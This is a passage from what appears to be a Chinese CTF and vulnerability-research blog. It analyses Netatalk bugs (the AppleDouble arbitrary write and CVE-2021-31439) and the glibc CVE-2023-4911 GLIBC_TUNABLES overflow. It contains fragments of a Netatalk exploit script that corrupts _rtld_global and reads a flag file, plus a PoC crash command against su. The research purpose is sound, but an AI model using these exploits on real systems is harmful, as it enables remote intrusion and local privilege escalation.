server.send(to_send)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建恶意文件的AppleDouble metadata,写入_rtld_global._dl_load_lock和_rtld_global._dl_rtld_lock_recursive</span></span><br><span class="line">appledouble = createAppleDoubleForArbWrite()</span><br><span class="line">response, request_id = FPWriteExt(p, request_id, fork2, <span class="number">0</span>, <span class="built_in">len</span>(appledouble), appledouble, debug)    </span><br><span class="line">Trigger(p, request_id, <span class="number">1</span>, volume_id, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="string">b"leak_file"</span>, debug)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>读文件:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p = connect(ip, port)</span><br><span class="line">response, request_id = DSIOpenSession(p, debug)</span><br><span class="line">response, request_id = FPLogin(p, request_id, <span class="string">b'AFP3.3'</span>, <span class="string">b'No User Authent'</span>, <span class="literal">None</span>, debug)</span><br><span class="line">response, request_id, volume_id = FPOpenVol(p, request_id, <span class="number">0x21</span>, <span class="built_in">bytes</span>(volume,encoding=<span class="string">'utf-8'</span>), <span class="literal">None</span>, debug)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response, request_id, fork4 = FPOpenFork(p, request_id, <span class="number">0</span>, volume_id, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="string">b"flag"</span>, debug)</span><br><span class="line">response, request_id = FPReadExt(p,request_id,fork4,<span class="number">0</span>,<span class="number">80</span>,debug)</span><br><span class="line"></span><br><span class="line">response, request_id = FPCloseFork(p, request_id, fork4, debug)</span><br><span class="line"></span><br><span class="line">DSICloseSession(p, request_id, debug)</span><br><span class="line">p.close()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403242324683.png"></p><h4 id="调试脚本"><a href="#调试脚本" class="headerlink" title="调试脚本"></a>调试脚本</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">target remote 127.0.0.1:1234</span><br><span class="line"></span><br><span class="line"># set detach-on-fork off</span><br><span class="line"># set follow-fork-mode child</span><br><span class="line">dir netatalk/etc/afpd</span><br><span class="line">dir netatalk/libatalk/adouble</span><br><span class="line">b ad_open.c:605</span><br><span class="line">b ad_rebuild_adouble_header_osx</span><br><span class="line">b __libc_system</span><br><span class="line">b fault_report</span><br><span class="line">handle SIGSEGV pass</span><br><span class="line">handle SIGSEGV nostop</span><br><span class="line">c</span><br></pre></td></tr></tbody></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>对parse_entries: <a href="https://github.com/Netatalk/netatalk/commit/c4cf72ccef819e9b186400e58af4aa9eadd10828">https://github.com/Netatalk/netatalk/commit/c4cf72ccef819e9b186400e58af4aa9eadd10828</a></p><blockquote><ul><li>pass in the size of the valid data we read from disk</li><li>drop redundant buf argument</li><li>early exit if bounds check fails</li></ul></blockquote><p>对ad_header_read:<a href="https://github.com/Netatalk/netatalk/commit/87f6a606a228bf2ca51db8ce1bdcf41d2d68c6bd">https://github.com/Netatalk/netatalk/commit/87f6a606a228bf2ca51db8ce1bdcf41d2d68c6bd</a></p><blockquote><ul><li>check there are not more then 16 AppleDouble entries</li><li>simplify check the AD entries fit into the read buffer</li><li>fail if parse_entries() returns an error</li></ul></blockquote><h2 id="CVE-2021-31439"><a href="#CVE-2021-31439" class="headerlink" title="CVE-2021-31439"></a>CVE-2021-31439</h2><blockquote><p>This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of Synology DiskStation Manager. Authentication is not required to exploit this vulnerablity. The specific flaw exists within the processing of DSI structures in Netatalk. The issue results from <code>the lack of proper validation of the length</code> of user-supplied data prior to copying it to a <code>heap-based buffer</code>. An attacker can leverage this vulnerability to execute code in the context of the current process. Was ZDI-CAN-12326.</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * Read DSI command and data</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param  dsi   (rw) DSI handle</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @return    DSI function on success, 0 on failure</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dsi_stream_receive</span><span class="params">(DSI *dsi)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> block[DSI_BLOCKSIZ];</span><br><span class="line"></span><br><span class="line">  LOG(log_maxdebug, logtype_dsi, <span class="string">"dsi_stream_receive: START"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;flags &amp; DSI_DISCONNECTED)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* read in the header */</span></span><br><span class="line">  <span class="keyword">if</span> (dsi_buffered_stream_read(dsi, (<span class="type">uint8_t</span> *)block, <span class="keyword">sizeof</span>(block)) != <span class="keyword">sizeof</span>(block)) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  dsi-&gt;header.dsi_flags = block[<span class="number">0</span>];</span><br><span class="line">  dsi-&gt;header.dsi_command = block[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;header.dsi_command == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_requestID, block + <span class="number">2</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_requestID));</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_data.dsi_doff, block + <span class="number">4</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_data.dsi_doff));</span><br><span class="line">  dsi-&gt;header.dsi_data.dsi_doff = htonl(dsi-&gt;header.dsi_data.dsi_doff);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_len, block + <span class="number">8</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_len));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_reserved, block + <span class="number">12</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_reserved));</span><br><span class="line">  dsi-&gt;clientID = ntohs(dsi-&gt;header.dsi_requestID);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* make sure we don't over-write our buffers. */</span></span><br><span class="line">  dsi-&gt;cmdlen = MIN(ntohl(dsi-&gt;header.dsi_len), dsi-&gt;server_quantum);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Receiving DSIWrite data is done in AFP function, not here */</span></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;header.dsi_data.dsi_doff) {</span><br><span class="line">      LOG(log_maxdebug, logtype_dsi, <span class="string">"dsi_stream_receive: write request"</span>);</span><br><span class="line">      dsi-&gt;cmdlen = dsi-&gt;header.dsi_data.dsi_doff;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dsi_stream_read(dsi, dsi-&gt;commands, dsi-&gt;cmdlen) != dsi-&gt;cmdlen)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  LOG(log_debug, logtype_dsi, <span class="string">"dsi_stream_receive: DSI cmdlen: %zd"</span>, dsi-&gt;cmdlen);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> block[<span class="number">1</span>];</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>关键部分:<br>类似于CVE-2018-1160,dsi_off字段未经过检查直接作为了dsi-&gt;cmdlen,进一步作为参数传入dsi_stream_read,其中dsi-&gt;commands缓冲区的长度为dsi-&gt;server_quantum(大小由启动配置决定)</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_data.dsi_doff, block + <span class="number">4</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_data.dsi_doff));</span><br><span class="line">dsi-&gt;header.dsi_data.dsi_doff = htonl(dsi-&gt;header.dsi_data.dsi_doff);</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_len, block + <span class="number">8</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_len));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* make sure we don't over-write our buffers. */</span></span><br><span class="line">dsi-&gt;cmdlen = MIN(ntohl(dsi-&gt;header.dsi_len), dsi-&gt;server_quantum);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Receiving DSIWrite data is done in AFP function, not here */</span></span><br><span class="line"><span class="keyword">if</span> (dsi-&gt;header.dsi_data.dsi_doff) {</span><br><span class="line">    LOG(log_maxdebug, logtype_dsi, <span class="string">"dsi_stream_receive: write request"</span>);</span><br><span class="line">    dsi-&gt;cmdlen = dsi-&gt;header.dsi_data.dsi_doff;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dsi_stream_read(dsi, dsi-&gt;commands, dsi-&gt;cmdlen) != dsi-&gt;cmdlen)</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>dsi_stream_read函数将来自网络的数据存储到dsi-&gt;commands中,由于未经检查的dsi-&gt;cmdlen可能超过dsi-&gt;server_quantum,可能造成堆溢出.<br>经以下调用链:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dsi_stream_receive</span><br><span class="line"> -&gt;dsi_stream_read</span><br><span class="line">  -&gt;buf_read</span><br><span class="line">   -&gt;from_buf</span><br><span class="line">   -&gt;readt</span><br></pre></td></tr></tbody></table></figure><p>最终在readt函数中发生堆溢出.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">len = recv(socket, (<span class="type">char</span> *) data + stored, length - stored, <span class="number">0</span>);</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403251321292.png"></p><p>观察dsi-&gt;commands缓冲区的空间,发现紧邻着libresolv共享库的不可写内存映像,且这一内存布局无法改变,<br>因为该空间是在建立一次会话时分配的,且每次建立会话都会是一个新的子进程,无法调整内存布局.<br>意味着溢出必定会发生段错误,没有进一步利用的空间,同时,recv函数会检测内存区域是否存在以及是否有对应权限,所以段错误也不会发生,进行错误处理,终止会话.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403251321590.png"></p><p>再跟一下dsi_doff字段的其他使用,未发现会造成安全问题的地方.判断该漏洞无法在Netatalk中完成利用.<br>(通告中的RCE说的是affected installations of Synology DiskStation Manager.)</p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> 应用层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-4911 GLIBC ld 堆溢出提权</title>
      <link href="/2024/CVE-2023-4911%20LD-HeapOverflow/"/>
      <url>/2024/CVE-2023-4911%20LD-HeapOverflow/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote><p>A buffer overflow was discovered in the GNU C Library’s dynamic loader ld.so while processing the GLIBC_TUNABLES environment variable. This issue could allow a local attacker to use maliciously crafted GLIBC_TUNABLES environment variables when launching binaries with SUID permission to execute code with elevated privileges.</p></blockquote><p>了解一下tunables相关内容 <a href="https://www.gnu.org/software/libc/manual/html_node/Tunables.html">https://www.gnu.org/software/libc/manual/html_node/Tunables.html</a></p><blockquote><p>Tunables are a feature in the GNU C Library that allows application authors and distribution maintainers to alter the runtime library behavior to match their workload.</p></blockquote><p>形式是由环境变量GLIBC_TUNABLES指示的由”:”分隔的键值对序列,如:<br>GLIBC_TUNABLES=glibc.malloc.trim_threshold=128:glibc.malloc.check=3</p><span id="more"></span><p>调试一下Poc: env -i “GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A”  /usr/bin/su –help<br>崩溃原因是在栈上读取时超出了栈的下界.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403151623529.png"></p><p>根据漏洞信息和崩溃点的栈回溯,来到处理tunables环境变量的文件,dl-tunables.c.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403152201028.png"></p><p>主要的处理流程实在__tunables_init函数中完成的.</p><ul><li>遍历所有的环境变量<ul><li>如果环境变量名是GLIBC_TUNABLES<ul><li>调用tunables_strdup将其拷贝到堆上</li><li>调用parse_tunables处理该环境变量的值,即由:分隔的键值对序列.</li></ul></li></ul></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Initialize the tunables list from the environment.  For now we only use the</span></span><br><span class="line"><span class="comment">   ENV_ALIAS to find values.  Later we will also use the tunable names to find</span></span><br><span class="line"><span class="comment">   values.  */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__tunables_init (<span class="type">char</span> **envp)</span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> *envname = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">char</span> *envval = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">size_t</span> len = <span class="number">0</span>;</span><br><span class="line">  <span class="type">char</span> **prev_envp = envp;</span><br><span class="line"></span><br><span class="line">  maybe_enable_malloc_check ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ((envp = get_next_env (envp, &amp;envname, &amp;len, &amp;envval,</span><br><span class="line">       &amp;prev_envp)) != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TUNABLES_FRONTEND == TUNABLES_FRONTEND_valstring</span></span><br><span class="line">      <span class="keyword">if</span> (tunable_is_name (GLIBC_TUNABLES, envname))</span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> *new_env = tunables_strdup (envname);</span><br><span class="line">  <span class="keyword">if</span> (new_env != <span class="literal">NULL</span>)</span><br><span class="line">    parse_tunables (new_env + len + <span class="number">1</span>, envval);</span><br><span class="line">  <span class="comment">/* Put in the updated envval.  */</span></span><br><span class="line">  *prev_envp = new_env;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></tbody></table></figure><p>tunables_strdup和strdup类似,就是将字符串拷贝到堆上.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *</span><br><span class="line"><span class="title function_">tunables_strdup</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *in)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (in[i++] != <span class="string">'\0'</span>);</span><br><span class="line">  <span class="type">char</span> *out = __minimal_malloc (i + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* For most of the tunables code, we ignore user errors.  However,</span></span><br><span class="line"><span class="comment">     this is a system error - and running out of memory at program</span></span><br><span class="line"><span class="comment">     startup should be reported, so we do.  */</span></span><br><span class="line">  <span class="keyword">if</span> (out == <span class="literal">NULL</span>)</span><br><span class="line">    _dl_fatal_printf (<span class="string">"failed to allocate memory to process tunables\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    out[i] = in[i];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> out;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>来看一下__minimal_malloc的实现.</p><ul><li>如果alloc_end为空,则需要初始化内存分配器<ul><li>通过外部变量_end(ld读写段的结束位置)对alloc_ptr进行赋值,将alloc_ptr上对齐到整页的地址作为alloc_end. alloc_ptr和alloc_end之间就是一个小的内存池.</li></ul></li><li>将alloc_ptr向上对齐到MALLOC_ALIGNMENT.(64位下是16字节)</li><li>如果内存池的容量不足以分配n字节(后面的条件n &gt;= -alloc_ptr看上去不是很容易理解,其实是避免地址回绕)<ul><li>将n向上对其到整页的大小,再额外增加一页的大小减少分配次数,通过mmap系统调用申请内存作为新的内存池.</li></ul></li><li>返回请求的内存空间<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Allocate an aligned memory block.  */</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line">__minimal_malloc (<span class="type">size_t</span> n)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span> (alloc_end == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">      <span class="comment">/* Consume any unused space in the last page of our data segment.  */</span></span><br><span class="line">      <span class="keyword">extern</span> <span class="type">int</span> _end attribute_hidden;</span><br><span class="line">      alloc_ptr = &amp;_end;</span><br><span class="line">      alloc_end = (<span class="type">void</span> *) <span class="number">0</span> + (((alloc_ptr - (<span class="type">void</span> *) <span class="number">0</span>)</span><br><span class="line"> + GLRO(dl_pagesize) - <span class="number">1</span>)</span><br><span class="line">&amp; ~(GLRO(dl_pagesize) - <span class="number">1</span>));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure the allocation pointer is ideally aligned.  */</span></span><br><span class="line">  alloc_ptr = (<span class="type">void</span> *) <span class="number">0</span> + (((alloc_ptr - (<span class="type">void</span> *) <span class="number">0</span>) + MALLOC_ALIGNMENT - <span class="number">1</span>)</span><br><span class="line">    &amp; ~(MALLOC_ALIGNMENT - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (alloc_ptr + n &gt;= alloc_end || n &gt;= -(<span class="type">uintptr_t</span>) alloc_ptr)</span><br><span class="line">    {</span><br><span class="line">      <span class="comment">/* Insufficient space left; allocate another page plus one extra</span></span><br><span class="line"><span class="comment"> page to reduce number of mmap calls.  */</span></span><br><span class="line">      <span class="type">caddr_t</span> page;</span><br><span class="line">      <span class="type">size_t</span> nup = (n + GLRO(dl_pagesize) - <span class="number">1</span>) &amp; ~(GLRO(dl_pagesize) - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (nup == <span class="number">0</span> &amp;&amp; n != <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">      nup += GLRO(dl_pagesize);</span><br><span class="line">      page = __mmap (<span class="number">0</span>, nup, PROT_READ|PROT_WRITE,</span><br><span class="line">     MAP_ANON|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">if</span> (page != alloc_end)</span><br><span class="line">alloc_ptr = page;</span><br><span class="line">      alloc_end = page + nup;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  alloc_last_block = (<span class="type">void</span> *) alloc_ptr;</span><br><span class="line">  alloc_ptr += n;</span><br><span class="line">  <span class="keyword">return</span> alloc_last_block;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li></ul><p>接下来是主逻辑parse_tunbales函数,它去掉不合法的tunable,重新在堆上的tunestr构建合法的tunestr.<br>参数tunestr是堆上的副本,将在其上构造合法tunestr.valstring是栈上的原始环境变量.</p><ul><li>初始化阶段,设置p=tunestr(堆上的副本),off=0.</li><li>进入大循环<ul><li>设置当前tunable的name=p</li><li>计算当前tunable的长度len,以’=’,’:’,’\0’作为终止</li><li>如果当前tunable没有值(‘=’)且没有下一个tunable(‘:’),设置tunestr[off]=’\0’,结束处理.</li><li>如果当前tunable没有值(‘=’)但还下一个tunable(‘:’),p+=len+1跳过当前name,开始新一轮循环</li><li>到这里说明当前tunable有一个键且有一个’=’,p+=len+1指向当前tunable的值.</li><li>设置value=&amp;valstring[p - tunestr],将value指向当前tunable的值,注意这里使用的是栈上的原始版本,将作为本次向堆上拷贝的值.</li><li>计算当前tunable值的长度.</li><li>对比当前tunable的键,如果存在于tunable_list中,则进行向堆上tunestr的拷贝.<ul><li>先从tunable_list中拷贝本次tunable的键到tunestr中</li><li>再从value中拷贝本次tunable的值到tunestr中</li><li>向value[len]写入’\0’,即将栈上的环境变量中’:’替换为’\0’</li><li>调用tunable_initialize初始化当前tunable.</li></ul></li><li>如果还有下一个tunable(p[len]!=’\0’),p+=len+1指向下一个tunable的键,进入下一次循环</li><li><code>否则不改变p的位置</code>,进入下一次循环.(<code>默认逻辑是在下一次循环中,p会从本次tunable的值开始扫描直到扫到结束符'\0',结束处理</code>.)</li></ul></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Parse the tunable string TUNESTR and adjust it to drop any tunables that may</span></span><br><span class="line"><span class="comment">   be unsafe for AT_SECURE processes so that it can be used as the new</span></span><br><span class="line"><span class="comment">   environment variable value for GLIBC_TUNABLES.  VALSTRING is the original</span></span><br><span class="line"><span class="comment">   environment variable string which we use to make NULL terminated values so</span></span><br><span class="line"><span class="comment">   that we don't have to allocate memory again for it.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">parse_tunables</span> <span class="params">(<span class="type">char</span> *tunestr, <span class="type">char</span> *valstring)</span></span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span> (tunestr == <span class="literal">NULL</span> || *tunestr == <span class="string">'\0'</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *p = tunestr;</span><br><span class="line">  <span class="type">size_t</span> off = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    {</span><br><span class="line">      <span class="type">char</span> *name = p;</span><br><span class="line">      <span class="type">size_t</span> len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* First, find where the name ends.  */</span></span><br><span class="line">      <span class="keyword">while</span> (p[len] != <span class="string">'='</span> &amp;&amp; p[len] != <span class="string">':'</span> &amp;&amp; p[len] != <span class="string">'\0'</span>)</span><br><span class="line">len++;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we reach the end of the string before getting a valid name-value</span></span><br><span class="line"><span class="comment"> pair, bail out.  */</span></span><br><span class="line">      <span class="keyword">if</span> (p[len] == <span class="string">'\0'</span>)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span> (__libc_enable_secure)</span><br><span class="line">    tunestr[off] = <span class="string">'\0'</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We did not find a valid name-value pair before encountering 